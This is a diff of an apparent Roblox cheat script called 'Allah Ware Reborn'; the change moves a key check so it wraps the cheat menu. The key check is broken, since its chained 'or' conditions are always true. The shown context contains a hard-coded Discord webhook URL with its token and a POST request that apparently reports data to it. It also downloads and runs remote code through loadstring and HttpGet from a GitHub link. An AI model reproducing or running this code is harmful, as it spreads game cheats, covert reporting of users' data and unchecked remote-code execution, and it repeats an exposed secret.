@@ -1,7 +1,4 @@
-if getgenv().Key == "galition" or "fuppeto" or "beele" or "lizze" or "exharketraters" or "purgrotabile" or "geay" or "reachrigy" or "odeshing" or "zucki" or "catermich" or "aphalphawky" or "sementa" or "ovistshing" or "sassee" or "wak" or "gerrickle" or "meogongsterthq" or "kauna" or "sificatible" or "rumaidered" or "nidae" or "soch3revf" or "expowe" or "ijanks" or "colabouniver" or "fantabulous" or "ducinewyers" or "eyemdsd" or "lainsignom" or "refleep24232" then
-elseif getgenv().Key == false then
-game.Players.LocalPlayer:Kick("Wrong Key")
-end
+
         
 
     getgenv().WebhookURLL = "https://discord.com/api/webhooks/1036571621659516992/SvDlMoy6kAPwh7imi-nt57r2Ebm3RsKOXNC7eeB7txiiw0bvBD8H5FDbpSlsvtduN0wa"
@@ -32,6 +29,7 @@ local abcdef =
 {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
+if getgenv().Key == "galition" or "fuppeto" or "beele" or "lizze" or "exharketraters" or "purgrotabile" or "geay" or "reachrigy" or "odeshing" or "zucki" or "catermich" or "aphalphawky" or "sementa" or "ovistshing" or "sassee" or "wak" or "gerrickle" or "meogongsterthq" or "kauna" or "sificatible" or "rumaidered" or "nidae" or "soch3revf" or "expowe" or "ijanks" or "colabouniver" or "fantabulous" or "ducinewyers" or "eyemdsd" or "lainsignom" or "refleep24232" then
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/EliasAtto1/idk/main/idk"))()
 local Window = Library:Window("Allah Ware Reborn", "🟢 Active", Enum.KeyCode.RightShift)
 local Main = Window:Tab("Main")
@@ -1013,5 +1011,7 @@ end
 	end
     end
 ---------------------
-
+elseif getgenv().Key == false then
+    game.Players.LocalPlayer:Kick("Wrong Key")
+    end
 
